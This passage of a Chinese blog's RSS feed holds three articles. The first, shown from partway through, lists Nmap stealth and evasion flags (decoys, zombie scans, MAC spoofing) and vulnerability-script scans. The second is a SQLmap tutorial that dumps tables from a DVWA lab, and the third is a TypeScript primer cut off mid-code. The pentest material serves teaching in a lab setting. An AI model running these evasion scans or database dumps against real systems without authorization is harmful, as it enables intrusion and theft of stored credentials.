<span># 修改默认 MTU 大小,但必须为 8 的倍数(8,16,24,32 等等)</span>
nmap --mtu <span>24</span>

<span># 生成随机数量的欺骗</span>
nmap -D RND:10 <span>[</span>target<span>]</span>

<span># 手动指定欺骗使用的 IP</span>
nmap -D decoy1,decoy2,decoy3 etc.

<span># 僵尸网络扫描, 首先需要找到僵尸网络的IP</span>
nmap -sI <span>[</span>Zombie IP<span>]</span> <span>[</span>Target IP<span>]</span>

<span># 指定源端口号</span>
nmap --source-port <span>80</span> IP

<span># 在每个扫描数据包后追加随机数量的数据</span>
nmap --data-length <span>25</span> IP

<span># MAC 地址欺骗,可以生成不同主机的 MAC 地址</span>
nmap --spoof-mac Dell/Apple/3Com IP
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="nmap-进行-web-漏洞扫描" tabindex="-1"> Nmap 进行 Web 漏洞扫描</h3>
<div><pre><code><span>cd</span> /usr/share/nmap/scripts/
<span>wget</span> https://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz <span>&amp;&amp;</span> <span>tar</span> xzf nmap_nse_vulscan-2.0.tar.gz
nmap -sS -sV --script<span>=</span>vulscan/vulscan.nse target
nmap -sS -sV --script<span>=</span>vulscan/vulscan.nse –script-args <span>vulscandb</span><span>=</span>scipvuldb.csv target
nmap -sS -sV --script<span>=</span>vulscan/vulscan.nse –script-args <span>vulscandb</span><span>=</span>scipvuldb.csv -p80 target
nmap -PN -sS -sV --script<span>=</span>vulscan –script-args <span>vulscancorrelation</span><span>=</span><span>1</span> -p80 target
nmap -sV --script<span>=</span>vuln target
nmap -PN -sS -sV --script<span>=</span>all –script-args <span>vulscancorrelation</span><span>=</span><span>1</span> target
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="nmap-端口扫描" tabindex="-1"> Nmap 端口扫描</h3>
<div><pre><code><span># 使用诱饵隐蔽扫描 nmap -D RND:10 [target] (生成随机数量的诱饵)</span>
<span># fargement</span>
<span># data packed – like orginal one not scan packet</span>
<span># 使用 auxiliary/scanner/ip/ipidseq 来在僵尸网络中查找IP并使用这些IP进行扫描 — nmap -sI ip target</span>
<span># nmap –source-port 53 target</span>

nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu<span>=</span><span>24</span> –data-length<span>=</span><span>1337</span> -T2 target <span>(</span>随机使用不同的IP进行扫描<span>)</span>
nmap -Pn -T2 -sV –randomize-hosts IP1,IP2
nmap –script smb-check-vulns.nse -p445 target <span>(</span>使用 NSE 脚本<span>)</span>
nmap -sU -P0 -T Aggressive -p123 target <span>(</span>攻击式扫描 T1-T5<span>)</span>
nmap -sA -PN -sN target
nmap -sS -sV -T5 -F -A -O target <span>(</span>版本检测<span>)</span>
nmap -sU -v target <span>(</span>Udp<span>)</span>
nmap -sU -P0 <span>(</span>Udp<span>)</span>
nmap -sC <span>192.168</span>.31.10-12 <span>(</span>全部使用默认配置<span>)</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="示例扫描" tabindex="-1"> 示例扫描</h2>
<h3 id="示例一-syn-扫描" tabindex="-1"> 示例一: SYN 扫描</h3>
<p><code>For Example:</code></p>
<div><pre><code>nmap -sS -T5 <span>192.168</span>.199.133
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-nmap-1.png" alt="Namp"></p>
<h3 id="示例二-基础信息扫描" tabindex="-1"> 示例二: 基础信息扫描</h3>
<p><code>For Example:</code></p>
<div><pre><code>nmap -O <span>192.168</span>.199.133
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-nmap-2.png" alt="Namp"></p>
<h3 id="示例三-详细信息扫描" tabindex="-1"> 示例三: 详细信息扫描</h3>
<p><code>For Example:</code></p>
<div><pre><code>nmap -A <span>192.168</span>.199.133
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-nmap-3.png" alt="Namp"></p>
<br>
<p><img src="/assets/liunx-nmap-4.png" alt="Namp"></p>
<br>
<p><img src="/assets/liunx-nmap-5.png" alt="Namp"></p>
<h3 id="示例四-网段扫描" tabindex="-1"> 示例四: 网段扫描</h3>
<p><code>For Example:</code></p>
<div><pre><code>nmap -T5 <span>192.168</span>.1.103-110
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/liunx-nmap-6.png" alt="Namp"></p>
<br>
<p><img src="/assets/liunx-nmap-7.png" alt="Namp"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/liunx-nmap-1.png" type="image/png"/>
    </item>
    <item>
      <title>渗透工具用法（一）SQLmap 的用法</title>
      <link>https://vxhly.github.io/views/pentest/usage-of-sqlmap.html</link>
      <guid>https://vxhly.github.io/views/pentest/usage-of-sqlmap.html</guid>
      <source url="https://vxhly.github.io/rss.xml">渗透工具用法（一）SQLmap 的用法</source>
      <description>前言
此系列笔记是网络渗透工具的使用方法, 本篇是介绍 SQL 注入工具 SQLmap 的使用方法。SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具, 有一个非常棒的特性, 即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。

</description>
      <category>pentest</category>
      <pubDate>Tue, 20 Sep 2016 10:46:46 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>此系列笔记是网络渗透工具的使用方法, 本篇是介绍 SQL 注入工具 SQLmap 的使用方法。SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具, 有一个非常棒的特性, 即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）。</p>
</div>

<h2 id="sqlmap-环境" tabindex="-1"> SQLmap 环境</h2>
<div><p>提示</p>
<p>由于 <code>kali Liunx</code> 已经集成了 SQLmap 的环境, 这里就直接介绍 <code>Windows</code> 下环境的构建。</p>
</div>
<h3 id="先安装-python" tabindex="-1"> 先安装 Python</h3>
<p>正常情况下我们安装 <code>2.7.x</code> 就好了。</p>
<p><a href="http://www.python.org/getit/" target="_blank" rel="noopener noreferrer">Python 官网下载地址</a></p>
<p>接下来只需在环境变量 <code>path</code> 中添加 Python 的安装路径就好了。<br></p>
<p><img src="/assets/sqlmap-1.png" alt="SQLmap"></p>
<h3 id="再安装-sqlmap" tabindex="-1"> 再安装 SQLmap</h3>
<p><a href="http://sqlmap.org/" target="_blank" rel="noopener noreferrer">SQLmap 官网下载地址</a></p>
<p>将 SQLmap 解压至 Python 目录下, 将 SQLmap 的程序目录重命名为 sqlmap。</p>
<h4 id="在桌面新建快捷方式" tabindex="-1"> 在桌面新建快捷方式</h4>
<p><code>For Example:</code></p>
<p><img src="/assets/sqlmap-2.png" alt="SQLmap"></p>
<br>
<p><img src="/assets/sqlmap-3.png" alt="SQLmap"></p>
<br>
<p><img src="/assets/sqlmap-4.png" alt="SQLmap"></p>
<h2 id="dvwa-环境" tabindex="-1"> DVWA 环境</h2>
<p>DVWA(Dam Vulnerable Web Application) 使用 <code>PHP+Mysql</code> 编写的一套用于常规 WEB 漏洞教学和检测的 WEB 脆弱性测试程序。包含 SQL 注入、XSS、盲注等常见的一些漏洞。</p>
<p><a href="http://github.com/ethicalhack3r/DVWA" target="_blank" rel="noopener noreferrer">DVWA GitHub 下载地址</a></p>
<p>在 <code>Windows</code> 下还需安装 <code>PHP</code> 环境, 这里推介两个 <code>PHP</code> 集成环境。</p>
<p><a href="http://www.upupw.net/" target="_blank" rel="noopener noreferrer">upupw PHP 集成环境</a> <a href="http://www.phpstudy.net/" target="_blank" rel="noopener noreferrer">phpStudy PHP 集成环境</a></p>
<p>接下来只需修改一下配置文件就好了。</p>
<h2 id="sqlmap-使用方法" tabindex="-1"> SQlmap 使用方法</h2>
<p><code>Windows</code> 下跟 <code>kali Liunx</code> 下使用方法不相同。</p>
<p>为方便演示, 我们创建两个虚拟机:</p>
<ul>
<li>受害者机器, <code>Windows 2003</code> 操作系统, 运行一个 WEB 服务器, 同时跑着一个包含漏洞的 WEB 应用（DVWA）。</li>
<li>攻击器机器, 使用 <code>kali Liunx</code> 或者其他版本的 <code>Windows</code> 包含 SQLmap 程序。</li>
</ul>
<p>本次实验的目的: 使用 SQLmap 得到以下信息:</p>
<ul>
<li>枚举 MYSQL 用户名与密码。</li>
<li>枚举所有数据库。</li>
<li>枚举指定数据库的数据表。</li>
<li>枚举指定数据表中的所有用户名与密码。</li>
</ul>
<h3 id="查看帮助" tabindex="-1"> 查看帮助</h3>
<p><code>Windows: </code> 查看 Python 帮助命令</p>
<div><pre><code>python sqlmap.py -h
</code></pre><div aria-hidden="true"><div></div></div></div><p><code>kali Liunx: </code> 查看 Python 帮助命令</p>
<div><pre><code>sqlmap -h
</code></pre><div aria-hidden="true"><div></div></div></div><div><p>注意</p>
<p>需要注意的是 <code>Windows</code> 下的选项和 <code>kali Liunx</code> 下的选项是一致的, 但是命令是不一致的。在 <code>Windows</code> 下使用 <code>python sqlmap.py</code> , 而在 <code>kali Liunx</code> 下使用的是 <code>sqlmap</code> 。</p>
</div>
<h3 id="选项解释" tabindex="-1"> 选项解释</h3>
<ul>
<li><strong>--cookie</strong> =&gt; 设置我们的 cookie 值 &quot;将 DVWA 安全等级设置为 low&quot;</li>
<li><strong>--data</strong> =&gt; 设置 POST 提交的值, 如果是 GET 提交, 不需要此选项</li>
<li><strong>-u</strong> =&gt; 指定目标 URL</li>
<li><strong>-b</strong> =&gt; 获取 DBMS banner</li>
<li><strong>--current-db</strong> =&gt; 获取当前数据库</li>
<li><strong>--current-user</strong> =&gt; 获取当前数据库的用户</li>
<li><strong>--tables</strong> =&gt; 获取数据库里所有的表名</li>
<li><strong>--columns</strong> =&gt; 获取表里的所有字段</li>
<li><strong>--dump</strong> =&gt; 获取值</li>
<li><strong>--current-user</strong> =&gt; 获取当前用户</li>
<li><strong>-D</strong> =&gt; 爆库指定数据库名</li>
<li><strong>-T</strong> =&gt; 爆库指定表名</li>
<li><strong>-C</strong> =&gt; 爆库指定字段名</li>
<li><strong>--string</strong> =&gt; 当查询可用时用来匹配页面中的字符串</li>
<li><strong>--users</strong> =&gt; 枚举 DBMS 用户</li>
<li><strong>--password</strong> =&gt; 枚举 DBMS 用户密码 hash</li>
<li><strong>--dbs</strong> =&gt; 枚举 DBMS 中的数据库</li>
</ul>
<h2 id="开始爆库" tabindex="-1"> 开始爆库</h2>
<p>由于 <code>Windows</code> 和 <code>kali Liunx</code> 的做法基本一致, 这里以 <code>kali Liunx</code> 为例。DVWA 的难度为 low。</p>
<h3 id="先获取-cookie" tabindex="-1"> 先获取 Cookie</h3>
<p>每一次的 Cookie 都不一样, 这里是个示范。</p>
<p><code>For Example:</code> <br></p>
<p><img src="/assets/sqlmap-5.png" alt="SQLmap"></p>
<h3 id="获取数据库-current-db" tabindex="-1"> 获取数据库, --current-db</h3>
<p><code>For Example:</code></p>
<div><pre><code>sqlmap -u <span>"//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie<span>=</span><span>"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low"</span> --current-db
</code></pre><div aria-hidden="true"><div></div></div></div><p>URL 地址和 Cookie 请用真实的替换掉。这条命令可以把当前所有的数据库获取出来的。注意 <code>--current-db</code> 的 <code>-</code> 可是有两个的。</p>
<p><img src="/assets/sqlmap-6.png" alt="SQLmap"></p>
<h3 id="获取表-tables" tabindex="-1"> 获取表, --tables</h3>
<p>前面, 我们已经获取到数据库名, 这时候我们要指定数据库名。使用 <code>-D</code> 选项指定数据库名。注意 <code>--tables</code> 的 <code>-</code> 可是有两个的。</p>
<p><code>For Example:</code></p>
<div><pre><code>sqlmap -u <span>"//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie<span>=</span><span>"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low"</span> -D <span>'dvwa'</span> --tables
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/sqlmap-7.png" alt="SQLmap"></p>
<h3 id="获取字段-columns" tabindex="-1"> 获取字段, --columns</h3>
<div><p>提示</p>
<p>前面, 我们已经获取到数据库名和表名了, 这时候我们要指定数据库名和表名。使用 <code>-D</code> 选项指定数据库名, 使用 <code>-T</code> 指定表名。这里我们选择表 <code>users</code> 。注意 <code>--columns</code> 的 <code>-</code> 可是有两个的。</p>
</div>
<p><code>For Example:</code></p>
<div><pre><code>sqlmap -u <span>"//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie<span>=</span><span>"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low"</span> -D <span>'dvwa'</span> -T <span>'users'</span> --columns
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/sqlmap-8.png" alt="SQLmap"></p>
<h3 id="获取数据-dump" tabindex="-1"> 获取数据, --dump</h3>
<div><p>提示</p>
<p>前面, 我们已经获取到数据库名、表名还有字段名了, 这时候我们要指定数据库名、表名还有字段名。使用 <code>-D</code> 选项指定数据库名, 使用 <code>-T</code> 指定表名, 使用 <code>-C</code> 指定字段名。这里我们选择表 <code>users</code> 中的字段 <code>user_id</code> 。注意 <code>--dump</code> 的 <code>-</code> 可是有两个的。</p>
</div>
<p><code>For Example:</code></p>
<div><pre><code>sqlmap -u <span>"//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#"</span> --cookie<span>=</span><span>"PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low"</span> -D <span>'dvwa'</span> -T <span>'users'</span> -C <span>'user_id'</span> --dump
</code></pre><div aria-hidden="true"><div></div></div></div><p><img src="/assets/sqlmap-9.png" alt="SQLmap"></p>
]]></content:encoded>
      <enclosure url="https://vxhly.github.io/assets/sqlmap-1.png" type="image/png"/>
    </item>
    <item>
      <title>typescript 的基础使用</title>
      <link>https://vxhly.github.io/views/typescript/typescript-usage.html</link>
      <guid>https://vxhly.github.io/views/typescript/typescript-usage.html</guid>
      <source url="https://vxhly.github.io/rss.xml">typescript 的基础使用</source>
      <description>前言
vue3 已经发布了, ts 的脚步已经阻拦不住了, 还只会 es6?别想了, 人家都已经在行动了, 以下是 ts 的基本系列教程, ts 的基本语法, 高级语法等, 以及在 vue 项目中如何应用 ts, 跟着我赶紧撸起来吧.

</description>
      <category>typescript</category>
      <pubDate>Tue, 18 May 2021 10:03:58 GMT</pubDate>
      <content:encoded><![CDATA[<div><p>前言</p>
<p>vue3 已经发布了, ts 的脚步已经阻拦不住了, 还只会 es6?别想了, 人家都已经在行动了, 以下是 ts 的基本系列教程, ts 的基本语法, 高级语法等, 以及在 vue 项目中如何应用 ts, 跟着我赶紧撸起来吧.</p>
</div>

<h2 id="基本数据类型" tabindex="-1"> 基本数据类型</h2>
<h3 id="数字" tabindex="-1"> 数字</h3>
<div><pre><code><span>const</span> a<span>:</span> <span>number</span> <span>=</span> <span>3</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="字符串" tabindex="-1"> 字符串</h3>
<div><pre><code><span>const</span> b<span>:</span> <span>string</span> <span>=</span> <span>"1"</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="数组" tabindex="-1"> 数组</h3>
<div><pre><code><span>const</span> c<span>:</span> <span>number</span><span>[</span><span>]</span> <span>=</span> <span>[</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>]</span><span>;</span>
<span>const</span> d<span>:</span> <span>Array</span><span>&lt;</span><span>number</span><span>></span> <span>=</span> <span>[</span><span>1</span><span>,</span> <span>3</span><span>]</span><span>;</span>
<span>const</span> arr<span>:</span> <span>any</span><span>[</span><span>]</span> <span>=</span> <span>[</span><span>1</span><span>,</span> <span>"33"</span><span>,</span> <span>true</span><span>]</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h3 id="元组" tabindex="-1"> 元组</h3>
<p>可以为数组中的每个参数定义相对应的类型</p>
<div><pre><code><span>const</span> e<span>:</span> <span>[</span><span>number</span><span>,</span> <span>string</span><span>]</span> <span>=</span> <span>[</span><span>1</span><span>,</span> <span>"ww"</span><span>]</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="枚举" tabindex="-1"> 枚举</h3>
<div><pre><code><span>enum</span> error <span>{</span>
  blue <span>=</span> <span>3</span><span>,</span>
  <span>"orange"</span><span>,</span>
<span>}</span>
<span>const</span> f<span>:</span> error <span>=</span> error<span>.</span>orange<span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>f<span>)</span><span>;</span> <span>//输出4</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>如果未赋值的上一个值是数字那么这个未赋值的值的是上一个值的值 +1 如果未赋值的上一个值未赋值那么输出的就是它的下标如果未赋值的上一个值的值是非数字, 那么必须赋值</p>
</div>
<h3 id="布尔类型" tabindex="-1"> 布尔类型</h3>
<div><pre><code><span>const</span> g<span>:</span> <span>boolean</span> <span>=</span> <span>true</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="对象" tabindex="-1"> 对象</h3>
<div><pre><code><span>const</span> i<span>:</span> object <span>=</span> <span>{</span><span>}</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="undefined" tabindex="-1"> undefined</h3>
<p>常用于组合类型</p>
<div><pre><code><span>let</span> j<span>:</span> <span>number</span> <span>|</span> <span>undefined</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="null" tabindex="-1"> null</h3>
<div><pre><code><span>let</span> k<span>:</span> <span>null</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="void" tabindex="-1"> void</h3>
<p>指定方法类型, 表示没有返回值,方法体中不能 return</p>
<div><pre><code><span>function</span> <span>aa</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
  <span>console</span><span>.</span><span>log</span><span>(</span><span>1</span><span>)</span><span>;</span>
<span>}</span>

<span>//如果方法有返回值, 可以加上返回值的类型</span>
<span>function</span> <span>bb</span><span>(</span><span>)</span><span>:</span> <span>number</span> <span>{</span>
  <span>return</span> <span>1</span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="never" tabindex="-1"> never</h3>
<p>其他类型 (包括 null 和 undefined)的子类型, 代表从不会出现的值</p>
<div><pre><code><span>let</span> l<span>:</span> <span>never</span><span>;</span>

<span>//匿名函数并抛出异常</span>
l <span>=</span> <span>(</span><span>(</span><span>)</span> <span>=></span> <span>{</span>
  <span>throw</span> <span>new</span> <span>Error</span><span>(</span><span>"111"</span><span>)</span><span>;</span>
<span>}</span><span>)</span><span>(</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="任意类型" tabindex="-1"> 任意类型</h3>
<p>让参数可以是任何一种类型</p>
<div><pre><code><span>let</span> h<span>:</span> <span>any</span> <span>=</span> <span>1</span><span>;</span>
h <span>=</span> <span>true</span><span>;</span>
h <span>=</span> <span>"st"</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><h2 id="函数" tabindex="-1"> 函数</h2>
<h3 id="函数申明" tabindex="-1"> 函数申明</h3>
<div><pre><code><span>function</span> <span>cc</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span><span>}</span>
</code></pre><div aria-hidden="true"><div></div></div></div><h3 id="方法传参" tabindex="-1"> 方法传参</h3>
<div><pre><code><span>function</span> <span>getUserInfo</span><span>(</span>name<span>:</span> <span>string</span><span>,</span> age<span>?</span><span>:</span> <span>number</span><span>,</span> school<span>:</span> <span>string</span> <span>=</span> <span>"清华大学"</span><span>)</span> <span>{</span>
  <span>return</span> <span><span>`</span><span>name:</span><span><span>${</span>name<span>}</span></span><span>--age:</span><span><span>${</span>age<span>}</span></span><span>--school:</span><span><span>${</span>school<span>}</span></span><span>`</span></span><span>;</span>
<span>}</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div></div></div><div><p>提示</p>
<p><code>:?</code> 代表这个参数可传可不传,不传就是 undefined,也可定义个默认的值</p>
</div>
<h3 id="剩余参数" tabindex="-1"> 剩余参数</h3>
<p>传递多个时, 如果用了剩余参数, 就可以把未定义的形参转换为数组。</p>
<div><pre><code><span>function</span> <span>sum</span><span>(</span>a<span>:</span> <span>number</span><span>,</span> b<span>:</span> <span>number</span><span>,</span> <span>...</span>arr<span>:</span> <span>number</span><span>[</span><span>]</span><span>)</span><span>:</span> <span>number</span> <span>{</span>
  <span>let</span> sum<span>:</span> <span>number</span> <span>=</span> a <span>+</span> b<span>;</span>
  arr<span>.</span><span>forEach</span><span>(</span><span>(</span>element<span>)</span> <span>=></span> <span>{</span>
    sum <span>+=</span> element<span>;</span>
  <span>}</span><span>)</span><span>;</span>
  <span>console</span><span>.</span><span>log</span><span>(</span>arr<span>)</span><span>;</span>
  <span>[</span><span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>]</span><span>;</span>
  <span>return</span> sum<span>;</span>
<span>}</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>sum</span><span>(</span><span>1</span><span>,</span> <span>2</span><span>,</span> <span>3</span><span>,</span> <span>4</span><span>,</span> <span>5</span><span>)</span><span>)</span><span>;</span> <span>//15</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h3 id="函数重载" tabindex="-1"> 函数重载</h3>
<div><pre><code><span>function</span> <span>reload</span><span>(</span>name<span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span><span>;</span>
<span>function</span> <span>reload</span><span>(</span>age<span>:</span> <span>number</span><span>)</span><span>:</span> <span>string</span><span>;</span>
<span>function</span> <span>reload</span><span>(</span>param<span>:</span> <span>any</span><span>)</span><span>:</span> <span>any</span> <span>{</span>
  <span>return</span> <span>typeof</span> param <span>===</span> <span>"string"</span> <span>?</span> <span><span>`</span><span>我是:</span><span><span>${</span>param<span>}</span></span><span>`</span></span> <span>:</span> <span><span>`</span><span>我的年龄:</span><span><span>${</span>param<span>}</span></span><span>`</span></span><span>;</span>
<span>}</span>
<span>console</span><span>.</span><span>log</span><span>(</span><span>reload</span><span>(</span><span>18</span><span>)</span><span>)</span><span>;</span> <span>//年龄</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>被重载的方法, 是没有方法体, 可以根据参数的类型走其中一个方法并判断参数, 但如果传入的参数类型不是任何被重载方法的参数类型就不允许通过。</p>
</div>
<h2 id="类" tabindex="-1"> 类</h2>
<div><pre><code><span>class</span> <span>Person</span> <span>{</span>
  <span>// 私有变量</span>
  <span>private</span> name<span>:</span> <span>string</span><span>;</span>

  <span>// 构造函数</span>
  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
  <span>}</span>

  <span>// 获取名字</span>
  <span>getName</span><span>(</span><span>)</span><span>:</span> <span>string</span> <span>{</span>
    <span>return</span> <span>this</span><span>.</span>name<span>;</span>
  <span>}</span>

  <span>// 设置名字</span>
  <span>setName</span><span>(</span>name<span>:</span> <span>string</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
  <span>}</span>
<span>}</span>

<span>let</span> p <span>=</span> <span>new</span> <span>Person</span><span>(</span><span>"张三"</span><span>)</span><span>;</span>
p<span>.</span><span>setName</span><span>(</span><span>"李四"</span><span>)</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>p<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><h2 id="继承" tabindex="-1"> 继承</h2>
<div><pre><code><span>class</span> <span>Son</span> <span>extends</span> <span>Person</span> <span>{</span>
  <span>// 静态属性</span>
  <span>public</span> <span>static</span> age<span>:</span> <span>number</span> <span>=</span> <span>18</span><span>;</span>
  <span>// 学校</span>
  <span>public</span> school<span>:</span> <span>string</span><span>;</span>
  <span>//构造方法</span>
  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>,</span> school<span>:</span> <span>string</span><span>)</span> <span>{</span>
    <span>// 访问派生类的构造函数中的 "this" 前, 必须调用 "super",初始化父类构造函数 --并把参数传给父类</span>
    <span>super</span><span>(</span>name<span>)</span><span>;</span>
    <span>//把传进来的school赋值给全局变量</span>
    <span>this</span><span>.</span>school <span>=</span> school<span>;</span>
  <span>}</span>
  <span>//静态方法</span>
  <span>static</span> <span>run</span><span>(</span>name<span>:</span> <span>string</span><span>)</span><span>:</span> <span>string</span> <span>{</span>
    <span>return</span> <span><span>`</span><span><span>${</span>name<span>}</span></span><span>在跑步,他的年龄才</span><span><span>${</span><span>this</span><span>.</span>age<span>}</span></span><span>`</span></span><span>;</span>
  <span>}</span>
<span>}</span>

<span>let</span> son <span>=</span> <span>new</span> <span>Son</span><span>(</span><span>"王五"</span><span>,</span> <span>"清华大学"</span><span>)</span><span>;</span>
son<span>.</span><span>setName</span><span>(</span><span>"赵六"</span><span>)</span><span>;</span> <span>// 私有类也不能在子类的外部访问,但可通过公开的方法中进行赋值和访问</span>
<span>console</span><span>.</span><span>log</span><span>(</span>son<span>)</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>Son<span>.</span><span>run</span><span>(</span><span>"方七"</span><span>)</span><span>)</span><span>;</span>
<span>console</span><span>.</span><span>log</span><span>(</span>Son<span>.</span>age<span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<ol>
<li>public 在当前类里面, 子类, 类外面都可以访问</li>
<li>protected 在当前类和子类内部可以访问, 类外部无法访问</li>
<li>private 在当前类内部可访问, 子类, 类外部都无法访问。</li>
<li>属性不加修饰符,默认就是公有的 (public)</li>
</ol>
</div>
<h2 id="多态" tabindex="-1"> 多态</h2>
<p>通过抽象方法/方法重载--实现多态--多态的作用是用来定义标准</p>
<div><pre><code><span>// 抽象父类</span>
<span>abstract</span> <span>class</span> <span>Animal</span> <span>{</span>
  <span>private</span> name<span>:</span> <span>string</span><span>;</span>
  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>)</span> <span>{</span>
    <span>this</span><span>.</span>name <span>=</span> name<span>;</span>
  <span>}</span>
  <span>//抽象成员--方法</span>
  <span>abstract</span> <span>eat</span><span>(</span><span>)</span><span>:</span> <span>any</span><span>;</span>
  <span>//抽象成员--属性</span>
  <span>protected</span> <span>abstract</span> ages<span>:</span> Number<span>;</span>
  <span>sleep</span><span>(</span><span>)</span><span>:</span> <span>void</span> <span>{</span>
    <span>console</span><span>.</span><span>log</span><span>(</span><span>"睡觉"</span><span>)</span><span>;</span>
  <span>}</span>
<span>}</span>

<span>class</span> <span>cat</span> <span>extends</span> <span>Animal</span> <span>{</span>
  ages<span>:</span> Number <span>=</span> <span>2</span><span>;</span>
  <span>constructor</span><span>(</span>name<span>:</span> <span>string</span><span>)</span> <span>{</span>
    <span>super</span><span>(</span>name<span>)</span><span>;</span>
  <span>}</span>
  <span>//非抽象类“cat”不会自动实现继承自“Animal”类的抽象成员“eat”,  必须手动定义父类中的抽象方法--多态</span>
  <span>eat</span><span>(</span><span>)</span><span>:</span> <span>string</span> <span>{</span>
    <span>return</span> <span>"猫吃鱼"</span><span>;</span>
  <span>}</span>

  <span>//多态</span>
  <span>sleep</span><span>(</span><span>)</span><span>:</span> <span>string</span> <span>{</span>
    <span>return</span> <span>"猫在睡觉"</span><span>;</span>
  <span>}</span>
<span>}</span>

<span>console</span><span>.</span><span>log</span><span>(</span><span>new</span> <span>cat</span><span>(</span><span>"33"</span><span>)</span><span>.</span><span>sleep</span><span>(</span><span>)</span><span>)</span><span>;</span>
</code></pre><div aria-hidden="true"><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div><div></div></div></div><div><p>提示</p>
<p>抽象类无法实例化。非抽象类继承抽象父类时不会自动实现来自父类的抽象成员,必须手动定义父类中的抽象成员, 否则报错。抽象成员包括属性和方法</p>
</div>
<h2 id="接口" tabindex="-1"> 接口</h2>
<p>在面向对象的编程中, 接口是一种规范的定义, 它定义了行为和动作的规范,</p>
<p>在程序设计里面, 接口起到一种限制和规范的作用。</p>
<p>接口定义了某一批类所需要遵守的规范, 接口不关心这些类的内部状态数据, 也不关心这些类里方法的实现细节, 它只规定这批类里必须提供某些方法, 提供这些方法的类就可以满足实际需要。ts 中的接口类似于 java, 同时还增加了更灵活的接口类型, 包括属性、函数、可索引和类等。</p>
<h3 id="属性接口" tabindex="-1"> 属性接口</h3>
<div><pre><code><span>interface</span> <span>InterfaceName</span> <span>{</span>
  first<span>:</span> <span>string</span><span>;</span>
